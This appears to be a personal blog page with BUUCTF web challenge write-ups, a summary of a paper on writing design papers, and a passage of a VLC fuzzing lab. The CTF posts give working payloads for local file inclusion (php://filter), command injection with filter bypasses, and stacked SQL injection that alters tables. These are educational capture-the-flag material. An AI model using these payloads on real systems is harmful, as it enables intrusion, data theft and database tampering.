<h4 id="3、WarmUp"><a href="#3、WarmUp" class="headerlink" title="3、WarmUp"></a>3、WarmUp</h4><p>查看源码，发现一个注释掉的source.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9f419731-7f5b-4275-b4e6-5e32b82f9524" alt="image"></p>
<p>访问php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f0dc177-7b92-4ba2-b8cd-84240fad2fec" alt="image"> </p>
<p>文件中有一个hint.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/42b87e8b-e8e6-4ef1-a95d-6d77fa4d0c2d" alt="image"> </p>
<p>查看该文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6e56260d-bf15-4c98-8d2a-92c4e0e5ccf0" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0a3b8cda-b707-4543-92f1-29d9ac5cb219" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/67c17320-e565-4ca3-9fae-23fd2ae47742" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d99f238-8882-4915-8ce8-2ac62ddbecf3" alt="image"> </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65f5d7a9-2b2d-49b0-accf-52264323d465&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、Include"><a href="#4、Include" class="headerlink" title="4、Include"></a>4、Include</h4><p>查看页面源代码，发现有个flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92cdcd45-b0de-4fcf-9957-58911c93bdf4" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e67bbbf4-6a41-4099-913e-6b726bc22d3a" alt="image"></p>
<p>查看页面源代码发现啥也看不见，猜测包含文件漏洞</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">重要的知识点——PHP封装协议：</span><br><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西；使用不同的参数可以达到不同的目的和效果：</span><br><span class="line">resource=&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选</span><br><span class="line">read=&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">&lt;；两个链的筛选列表&gt; 任何没有以 read= 或write=作前缀 的筛选器列表会视情况应用于读或写链。</span><br><span class="line">php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</span><br><span class="line">read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</span><br></pre></td></tr></table></figure>

<p>php:&#x2F;&#x2F;filter协议，用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容，然后经过base64解码就可以看到flag</p>
<p>payload: <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>得到base64编码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3d9b0b25-dc61-4525-bd9f-e5b9b47912ea" alt="image"></p>
<p>解码得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1d3da52f-a110-4e54-b8c8-515c3af99420" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9c483c1a-9c62-41d3-abd8-51e64d50357f&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h4><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
<p>首先查看此文件的目录：127.0.0.1|ls</p>
<p>点击ping后发现有个index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
<p>点击ping后可以看到一个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h4><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
<p>查看此文件的目录，发现有两个文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
<p>查看flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
<p>它说空格被过滤了</p>
<p>命令中空格被过滤的解决方法：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt: $IFS$9 $9指传过来的第9个参数</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg (\x20转换成字符串就是空格)</span><br></pre></td></tr></table></figure>

<p>发现符号又被过滤了，说明<code>&#123;&#125;</code>大括号被过滤了</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/edc798c1-1d33-40e5-ba2d-3044ba3e2d10" alt="image"></p>
<p>用另一个方法试下index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/614c2964-8a82-41be-b50c-51b4d29bc50e" alt="image"></p>
<p>有一个参数a，<strong>变量拼接字符串——将a的值覆盖，然后进行绕过</strong></p>
<p>构造payload：<code>/?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>
<p>用变量拼接成flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1db4f885-23d5-40b5-9d8a-291a10eae7f6" alt="image"></p>
<p>啥也没有，查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8ea1b222-1b2e-420a-8a81-137e674b2caf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;97aede41-9723-4901-8ac2-b345d66af44b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="7、随便注"><a href="#7、随便注" class="headerlink" title="7、随便注"></a>7、随便注</h4><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1fe10469-06c6-4c22-87f0-1a3886b61577" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0cd3e27d-e133-4673-bcc7-2d008ce22b09" alt="image"></p>
<p>查询3时没有显示，说明有两个字段</p>
<p>爆数据库：1’;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d0f5ed71-751c-4117-9195-f3178caa3dd2" alt="image"></p>
<p>爆表名：1’; show tables;#</p>
<p>出来了两个表</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f636bbac-e56c-4091-bf74-ebe0f39634cf" alt="image"></p>
<p>查看words表列名：1’; show columns from words;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6bdf874f-d98f-49ee-a0e6-b5a1df7495b0" alt="image"></p>
<p>查看1919810931114514表列名：0’; show columns from <code>1919810931114514</code>;#</p>
<p>注意：表名为数字时，要用反引号包起来查询</p>
<p>看到flag，说明表1919810931114514中有flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1be25d80-699d-4449-981a-4ba85f3228b3" alt="image"></p>
<p>查看大佬的方法</p>
<ul>
<li><p>通过 rename 先把 words 表改名为其他的表名。</p>
</li>
<li><p>把 1919810931114514 表的名字改为 words 。</p>
</li>
<li><p>给新 words 表添加新的列名 id 。</p>
</li>
<li><p>将 flag 改名为 data </p>
<p>1’; rename table words to word1; rename table <code>1919810931114514</code> to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/595a5ad4-0393-4542-9b16-f32cd7633903" alt="image"></p>
</li>
</ul>
<p>最后输入：1’ or 1&#x3D;1;#</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b2b3bcda-a630-4c63-a614-a68ba770a02a" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;aa75e48d-8389-408e-9c8c-9d30c81c432b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="8、EasySQL"><a href="#8、EasySQL" class="headerlink" title="8、EasySQL"></a>8、EasySQL</h4><p>输入1，有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/24aa574b-2e43-454e-8df1-8dbb3b104abd" alt="image"></p>
<p>爆数据库：1;show databases;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0320260a-c0f9-4e36-b544-bb0ba53de8a0" alt="image"></p>
<p>爆表：1;show tables;#</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ee2d1ebd-03b9-48f9-984f-10acee8da107" alt="image"></p>
<p>爆字段：1;show columns from FLAG;#</p>
<p>显示Nonono</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/faaaf7dd-fd3e-4fe1-8eb9-2c66d9b23046" alt="image"></p>
<p>查看大佬博客后，构造payload：*,1</p>
<p>参考博客（[BUUCTF-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46918279/article/details/120188186">SUCTF 2019]EasySQL1__Monica_的博客-CSDN博客</a>）</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9321cfe6-b625-4707-9703-8ecbdf5d1a9b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7c0c6069-c1fe-4314-b793-9a214f11fdb3&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" data-id="cll0v0lih0000povf909mhcek" data-title="Buuctf Web（1-8）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-How (and How Not) to Write a Good Design Paper" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/03/Paper-How%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper/" class="article-date">
  <time class="dt-published" datetime="2023-08-03T03:00:09.000Z" itemprop="datePublished">2023-08-03</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/03/Paper-How%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper/">How (and How Not) to Write a Good Design Paper</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="How-and-How-Not-to-Write-a-Good-Design-Paper-论文细读"><a href="#How-and-How-Not-to-Write-a-Good-Design-Paper-论文细读" class="headerlink" title="How (and How Not) to Write a Good Design Paper 论文细读"></a>How (and How Not) to Write a Good Design Paper 论文细读</h3><h4 id="如何（如何不）写一篇好的设计论文"><a href="#如何（如何不）写一篇好的设计论文" class="headerlink" title="如何（如何不）写一篇好的设计论文"></a>如何（如何不）写一篇好的设计论文</h4><p><a href="extension://bfdogplmndidlpjfhoijckpakkdjkkil/pdf/viewer.html?file=https%3A%2F%2Fwww.ida.liu.se%2F~matar63%2Fdesignpaper.pdf">extension:&#x2F;&#x2F;bfdogplmndidlpjfhoijckpakkdjkkil&#x2F;pdf&#x2F;viewer.html?file&#x3D;https%3A%2F%2Fwww.ida.liu.se%2F~matar63%2Fdesignpaper.pdf</a></p>
<h4 id="论文类别"><a href="#论文类别" class="headerlink" title="论文类别"></a>论文类别</h4><p>1、论文呈现了一个真正的设计项目，要么通过整个设计项目的全球调查，要么通过设计中体现的特定主题的选择性审查</p>
<p>2、论文展示了从未实现或实例化的概念设计工作，使用了我们认为设计者应该知道的想法或技术</p>
<p>3、论文解决了研究领域的一个方向，比如说可持续性</p>
<h4 id="投稿的评价标准"><a href="#投稿的评价标准" class="headerlink" title="投稿的评价标准"></a>投稿的评价标准</h4><h5 id="独到见解"><a href="#独到见解" class="headerlink" title="独到见解"></a>独到见解</h5><p>将论文投稿至与原创作品相关的会议或期刊时，论文至少包含一个新的想法，我们必须熟悉论文所涉及领域的最新技术和研究现状，才能知道我们的工作的原创的。</p>
<p>我们能简明扼要地陈述这个新想法吗？如果我们的论文是为了推进知识的状态，那么我们的读者必须能够发现新思想并理解它们。尝试把每个想法写在一个段落中，一般精通领域相关的人都能理解。如果做不到把每个想法写在一个段落中，那么可能我们自己没有真正理解这个想法的可能性，当我们有了框架，在论文摘要中要写到它们。</p>
<p>要解决的具体设计挑战是什么？我们不能之王读者只看到设计解决方案的描述就猜到我们面临的挑战或问题。一定要具体解释为什么以前的论文没法很好解决我们的设计挑战。</p>
<p>这些想法是否足够重要，足以证明论文的合理性？通常，描述真实设计工作的论文包含一到两个既定技术的改进，新的想法可以用几段话来描述，没必要一篇论文写20页，这样可能会掩盖实际的创新。开发一个真正的设计是一项繁重的工作，作者有时会不经意间将全部努力与新工作混为一谈，如果创新小，在合适的期刊或会议上发表一篇简短的论文或笔记，比发表完整论文更合适。</p>
<p>描述的工作是否与现有的相关工作有显著不同？我们基于先前发表的方法、技术或设计解决方案的扩张，不值得发表，我们必须证明自己的工作代表着与先进技术的背离，如果做不到，问自己为什么要写这篇文章，我们要让更多人愿意看我们的文章。</p>
<p>相关工作都有参考吗，针对读过被引用的材料吗？除非我们明确地将论文与之前发表的作品区分开，否则很耐说服读者相信我们的原创性。并且，如果读者读过被引用的文章，而我们没读过，那么会更难说服读者认可我们方法的优越性。</p>
<p>与以前工作的比较是否清楚和明确？我们不能简单地说我们的方法与别人的有所不同，我们要具体地说，我们的用户界面方法使用的是有形的部件，而不是像别人那样设计的触摸板，预期会增加几个用户的合作与参与度。</p>
<p>这项工作是否包含了对早期但未经证实的想法的扩展，验证或否定？支持或反驳先前发表的论文设计的评估经验是非常有价值的。</p>
<p>我们引用的最古老的论文是什么，最新的呢？有没有提到其他机构的类似工作？引用过技术报告，未发表的备忘录，未审阅的在线材料，个人交流吗？这些问题有助于提醒我们在知识或理解上存在的盲点。</p>
<h5 id="现实"><a href="#现实" class="headerlink" title="现实"></a>现实</h5><p>这篇论文描述的是一些已经以某种方式实现的东西还是完全是概念性的？有很多论文在结束语部分才会揭示，这是不太好的，读者英高在一开始就知道正在讨论的设计作品是一个真正的设计项目，还是仅仅为论证而做的概念设计。</p>
<p>如果设计已经实现，它是如何被使用的，这种使用表明了关于想法的实际重要性的什么？如果设计工作是一个尚未实现或原型化的概念，那么这些想法现在是否有出版的理由？审稿人通常对只有设计而没有任何评估的论文持怀疑态度，除非有高质量的新想法。</p>
<h5 id="教训"><a href="#教训" class="headerlink" title="教训"></a>教训</h5><p>如果我们在工作中什么都没学到，那么读者也学不到，我们的论文只会浪费读者的时间。我们要清楚地陈述我们结论所基于的假设，并且在陈述结论时，有必要再次陈述假设，因为读者读到后面可能会忘记假设。</p>
<h5 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h5><p>我们考虑了哪些备选方案，为什么会做出这样的选择？一篇好的论文不只是描述，而是解释，我们要告诉读者我们做了什么，并不是让他们知道我们的选择有多仔细。</p>
<p>这些选择最终被证明是正确的吗？如果是，那么最初选择它的原因是什么，我们从这个经理中学到了什么？如果我们在研究过程中碰到了死胡同，可以记录下来，让读者不要走同样的死胡同。</p>
<h5 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h5><p>如果想读者对我们的观点持支持态度，我们要首先将论点假设陈述出来。</p>
<p>它们现实吗？对于理论研究，必须清楚假设如何反应现实。</p>
<p>工作对假设的变化是否敏感？如果如果结果巧妙地建立在一个由不稳定的假设组成的高塔上，那么对于读者来说，它的用处将不如建立在更广泛，更牢固的基础上的结果有用。</p>
<p>如果提出一个理论模型，它是否给出了新的信息和见解？简单地为模型本身定义并没有用。</p>
<h5 id="焦点"><a href="#焦点" class="headerlink" title="焦点"></a>焦点</h5><p>介绍性材料是否包含我们的主要设计重点的多余内容？我们要避免在同一个深度层次上描述你的设计所由的主要特征，应该专注于新颖或不寻常的内容，这才是论文原始设计内容的重点。</p>
<h5 id="演讲"><a href="#演讲" class="headerlink" title="演讲"></a>演讲</h5><p>这些想法是否以清晰且有逻辑的方式组织和呈现？术语在使用前是否有明确定义？前向引用是否保持在最低限度？当读者反复遇到“***将在后面一节详细描述”这样的语句时会感到非常恼火，读者必须记住专业术语，且此时还没给出这个术语的定义，这对读者来说是不易于理解的。</p>
<p>摘要是先写的吗？它是否传达了论文的重要思想？论文中描述设计的摘要被滥用严重，摘要通常是一个散文的目录，而不是论文的技术内容摘要。</p>
<p>论文写完了吗？审稿人通常可以帮忙改进论文，但是不能替我们写。并且在描述设计的论文中，审稿人不能容忍作者遗漏重要的解释或论证。</p>
<h5 id="写作风格"><a href="#写作风格" class="headerlink" title="写作风格"></a>写作风格</h5><p>文章是否清晰简洁？单词的拼写和使用正确吗？句子是否完整，语法是否正确？是否避免歧义？在提交论文前，我们要仔细阅读论文，检查错误。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>在写论文，组织演讲时，我们要不断问自己上述的问题。有一些问题针对的是“设计”论文中的具体问题，有的适用于一般的研究论文。写一篇好的论文是一项艰苦的工作，但是我们能学到很多，并且帮助读者从我们的想法中有所收获。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/03/Paper-How%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper/" data-id="clrsrunn6000340vf5mroh7ep" data-title="How (and How Not) to Write a Good Design Paper" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Exercise 7 - VLC Media Player" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/" class="article-date">
  <time class="dt-published" datetime="2023-08-01T15:21:53.000Z" itemprop="datePublished">2023-08-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/01/Exercise%207%20-%20VLC%20Media%20Player/">Exercise 7 - VLC Media Player</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Exercise-7-VLC-Media-Player"><a href="#Exercise-7-VLC-Media-Player" class="headerlink" title="Exercise 7 - VLC Media Player"></a>Exercise 7 - VLC Media Player</h3><h4 id="一、实验背景"><a href="#一、实验背景" class="headerlink" title="一、实验背景"></a>一、实验背景</h4><p><strong>CVE-2019-14776</strong>是一个越界读取漏洞，可以通过精心制作的WMV&#x2F;ASF (Windows Media Video)文件触发。越界读取是当程序读取数据超过预期缓冲区的末尾或开始之前时发生的漏洞。因此，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p>
<p>越界读取漏洞（<a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/125.html%EF%BC%89">https://cwe.mitre.org/data/definitions/125.html）</a></p>
<p><strong>部分仪器仪表</strong></p>
<p>使用进化覆盖引导的模糊器的优点之一是，它能够自己找到新的执行路径。然而，这通常也是一个缺点。当我们面对具有高度模块化架构的软件(如VLC媒体播放器)时，每个模块执行特定的任务。</p>
<p>那么，假设我们给监控器提供了一个有效的MKV文件。但是在对输入文件进行了几次修改之后，“magic bytes”文件发生了变化，现在我们的程序将输入文件视为AVI文件。因此，这个“变异的MKV文件”现在由AVI Demux处理。一段时间后，文件魔术字节再次改变，现在文件被视为MPEG文件。在这两种情况下，这个新修改的文件增加代码覆盖率的可能性都很低，因为这个新文件没有任何有效的语法结构。</p>
<p>简而言之，如果我们不对代码覆盖率施加限制，模糊测试者很容易选择错误的路径，从而使模糊测试过程效率降低。</p>
<p>为了解决这个问题，afl++包含了一个部分插装特性，它允许指定应该使用或不使用插装来编译哪些函数&#x2F;文件。这有助于模糊器专注于程序的重要部分，通过执行无趣的代码路径来避免不必要的噪声和干扰。</p>
<p>为了使用它，我们在编译时设置环境AFL_LLVM_ALLOWLIST变量。这个环境变量必须指向一个包含所有应该检测的函数&#x2F;文件名的文件。</p>
<p>afl++部分仪器（<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.instrument_list.md%EF%BC%89">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.instrument_list.md）</a></p>
<h4 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h4><p>模糊<strong>VLC</strong>媒体播放器。目标是在VLC 3.0.7.1中找到<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2019-14776"><strong>CVE-2019-14776</strong></a>的崩溃&#x2F;PoC</p>
<h4 id="三、实验环境："><a href="#三、实验环境：" class="headerlink" title="三、实验环境："></a>三、实验环境：</h4><p>win10，VMware，Ubuntu 20.04.2 LTS（虚拟机用户名密码均为fuzz）</p>
<h4 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h4><h5 id="1、下载并构建目标"><a href="#1、下载并构建目标" class="headerlink" title="1、下载并构建目标"></a>1、下载并构建目标</h5><p>得到模糊目标，为要模糊化的项目创建一个新目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_vlc &amp;&amp; cd fuzzing_vlc</span><br></pre></td></tr></table></figure>

<p>下载并解压vlc-3.0.7.1.tar.xz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.videolan.org/pub/videolan/vlc/3.0.7.1/vlc-3.0.7.1.tar.xz</span><br><span class="line">tar -xvf vlc-3.0.7.1.tar.xz &amp;&amp; cd vlc-3.0.7.1/</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3202c8c2-020e-43e7-acdd-6b1fc2e1b5d3" alt="image"></p>
<p>发现下载链接连接失败，用管理员身份下载，解决问题</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/cd3e5bab-c56e-461b-bf35-3a206fe5ca17" alt="image"></p>
<h5 id="2、构建VCL"><a href="#2、构建VCL" class="headerlink" title="2、构建VCL"></a>2、构建VCL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=&quot;$HOME/fuzzing_vlc/vlc-3.0.7.1/install&quot; --disable-a52 --disable-lua --disable-qt</span><br><span class="line">make -j$(nproc)</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b5ea12b-8a45-4fc8-98c8-055762f3074e" alt="image"></p>
<p>报错</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0abd4ced-6a37-410c-abbd-67d841f13c68" alt="image"></p>
<p>解决方案</p>
<p>安装一些必要的依赖库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libxcb-composite0-dev libxcb-glx0-dev libxcb-dri2-0-dev libxcb-xf86dri0-dev libxcb-xinerama0-dev libxcb-render-util0-dev</span><br><span class="line">apt-get install libxcb-xv0-dev</span><br><span class="line">apt-get install libxcb-randr0-dev</span><br><span class="line">apt-get install libasound2-dev</span><br><span class="line">apt-get install libvlc-dev</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0982fa2d-3152-4151-8ada-79eb2f254b18" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/34af0e30-08f8-44bc-9349-8f8e6ce30010" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96b4bcc3-158c-4b6e-ba44-2ababb31bfad" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9f19e66f-ad36-4128-9c95-612efba4dd7e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/73c23d48-c702-439c-97f2-8662bad8ad61" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e218173c-f154-40cb-aca9-f3963f021a79" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d737430f-45fd-4c50-bde3-90fc21f656b8" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b0692ec5-08db-4708-8dd7-de887b5a130e" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/440e516b-b84e-46c4-811b-a04766c51586" alt="image"></p>
<p>安装完依赖库后，重新运行.config，成功构建VCL</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fd9c3400-3ea2-4430-baa4-e1e3748ca356" alt="image"></p>
<p>测试工作是否正确</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/vlc-static --help</span><br></pre></td></tr></table></figure>

<p>如看到以下页面，说明工作正确</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f1b8946-18bc-46d3-a7ef-e80a8c48401c" alt="image"></p>
<h5 id="3、种子语料库创建"><a href="#3、种子语料库创建" class="headerlink" title="3、种子语料库创建"></a>3、种子语料库创建</h5><p>可以在<a target="_blank" rel="noopener" href="https://samples.ffmpeg.org/">ffmpeg示例库</a>中找到大量视频示例。</p>
<p>建议挑选一些样本，然后使用视频编辑器将视频文件缩小到尽可能小的大小。</p>
<p>以下是一些开源视频编辑器的例子:</p>
<p>——(OpenShot) (<a target="_blank" rel="noopener" href="https://www.openshot.org/">https://www.openshot.org/</a>)</p>
<p>——(Shotcut) (<a target="_blank" rel="noopener" href="https://shotcut.org/">https://shotcut.org/</a>)</p>
<p>或者复制<a href="./InputCorpus/short2.wmv">short2.wmv</a>和<a href="./InputCorpus/veryshort.wmv">veryshort.wmv</a>文件到AFL输入文件夹</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/723e0f2a-62c7-4376-b9e2-c3e281cf0240" alt="image"></p>
<h5 id="4、fuzzing线束"><a href="#4、fuzzing线束" class="headerlink" title="4、fuzzing线束"></a>4、fuzzing线束</h5><p>如果尝试直接模糊“vlc-static”二进制文件，将看到AFL每秒只执行几次。这是因为VLC启动非常耗时。这就是为什么为模糊测试VLC创建一个自定义模糊测试线束。</p>
<p>修改’ ‘ .&#x2F;test&#x2F;vlc-demux-run.c ‘ ‘文件以包含模糊测试工具。通过这种方式，只需执行以下操作即可编译该harness:</p>
